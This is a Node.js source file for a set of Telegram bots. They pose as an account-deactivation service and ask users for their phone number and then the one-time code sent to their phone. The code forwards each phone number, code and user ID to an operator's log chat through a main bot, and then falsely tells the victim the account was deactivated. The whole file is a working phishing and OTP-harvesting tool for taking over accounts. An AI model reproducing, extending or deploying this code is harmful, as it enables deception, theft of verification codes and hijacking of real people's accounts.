const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');

// Load bot config from data.json
const config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));

const mainBot = new TelegramBot(config.mainBot.token, { polling: true });

let userStates = {}; // key: `${botName}_${userId}`

// Loop through all client bots
config.clientBots.forEach((botConfig) => {
  const bot = new TelegramBot(botConfig.token, { polling: true });

  bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Deactivate your account:\n\nClick to continue', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Deactivate your account', callback_data: 'deactivate' }]]
      }
    });
  });

  bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    if (query.data === 'deactivate') {
      bot.sendMessage(chatId, 'Please enter your phone number:');
      userStates[`${botConfig.name}_${chatId}`] = { step: 'awaiting_phone' };
    }
  });

  bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const stateKey = `${botConfig.name}_${chatId}`;
    const userState = userStates[stateKey];

    if (!userState || msg.text.startsWith('/')) return;

    if (userState.step === 'awaiting_phone') {
      userStates[stateKey] = {
        step: 'awaiting_otp',
        phone: msg.text
      };
      bot.sendMessage(chatId, 'Please enter the OTP sent to your phone:');
    } else if (userState.step === 'awaiting_otp') {
      const log = `📲 ${botConfig.name}\nUser ID: ${chatId}\nPhone: ${userState.phone}\nOTP: ${msg.text}`;
      bot.sendMessage(chatId, '✅ Account successfully deactivated.');
      mainBot.sendMessage(config.mainBot.logChatId, log);
      delete userStates[stateKey];
    }
  });
});
